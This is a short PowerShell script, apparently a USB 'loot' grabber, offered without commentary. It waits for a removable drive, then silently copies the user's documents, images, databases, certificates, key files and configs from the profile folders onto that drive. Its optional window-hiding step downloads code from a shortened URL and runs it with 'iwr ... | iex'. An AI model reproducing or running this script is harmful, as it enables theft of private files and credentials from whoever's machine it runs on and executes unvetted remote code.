clear;$u=$env:USERPROFILE;$hidden = Read-Host "Would you like to hide this console window? (Y/N)";$removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 };$count = $removableDrives.count;write "Connect a Device." ;While($count -eq $removableDrives.count){ $removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 };sleep 1}$d = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Sort-Object -Descending | Select-Object -First 1;$dL = $d.DeviceID;write "Loot Drive Set To : $dL/";$fileExtensions = @("*.log", "*.db", "*.txt", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft", "*.zip");$foldersToSearch = @("$u\Documents", "$u\Desktop", "$u\Downloads", "$u\OneDrive", "$u\Pictures", "$u\Videos") ;$destinationPath = "$dL\$env:COMPUTERNAME`_Loot";if (-not (Test-Path -Path $destinationPath)){ New-Item -ItemType Directory -Path $destinationPath -Force;write "New Folder Created : $destinationPath"}If ($hidden -eq 'y'){ write "Hiding the Window..";sleep 1;$v = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion;$y = $v.Substring(0, 2);if ($y -gt 21){ iwr https://is.gd/HidePS | iex }else{$Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';add-type -name win -member $Import -namespace native;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);;}}foreach ($folder in $foldersToSearch){foreach ($extension in $fileExtensions){ $files = Get-ChildItem -Path $folder -Recurse -Filter $extension -File;foreach ($file in $files){ $destinationFile = Join-Path -Path $destinationPath -ChildPath $file.Name;Copy-Item -Path $file.FullName -Destination $destinationFile -Force}}}(New-Object -ComObject Wscript.Shell).Popup("Done");exit